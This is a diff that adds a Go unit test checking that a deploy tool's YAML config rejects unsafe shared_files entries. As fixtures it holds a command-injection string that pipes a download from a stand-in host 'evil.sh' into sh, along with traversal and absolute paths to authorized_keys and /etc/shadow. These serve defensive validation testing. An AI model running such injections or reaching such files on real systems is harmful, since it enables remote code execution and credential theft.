@@ -138,6 +138,50 @@ func TestLoadProjectConfig_ValidatesSharedDirs(t *testing.T) {
 	}
 }
 
+func TestLoadProjectConfig_ValidatesSharedFiles(t *testing.T) {
+	tests := []struct {
+		name    string
+		yaml    string
+		wantErr bool
+	}{
+		{
+			"valid shared files",
+			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_files:\n    - .env.local\n    - config/secrets/prod/prod.decrypt.private.php\n",
+			false,
+		},
+		{
+			"shell injection in shared file",
+			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_files:\n    - \"a; curl evil.sh | sh\"\n",
+			true,
+		},
+		{
+			"path traversal in shared file",
+			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_files:\n    - \"../../root/.ssh/authorized_keys\"\n",
+			true,
+		},
+		{
+			"absolute path in shared file",
+			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_files:\n    - /etc/shadow\n",
+			true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := t.TempDir()
+			path := filepath.Join(dir, "frankendeploy.yaml")
+			if err := os.WriteFile(path, []byte(tt.yaml), 0644); err != nil {
+				t.Fatal(err)
+			}
+
+			_, err := LoadProjectConfig(path)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("LoadProjectConfig() error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
 func TestLoadProjectConfig_RejectsUnknownFields(t *testing.T) {
 	tests := []struct {
 		name    string
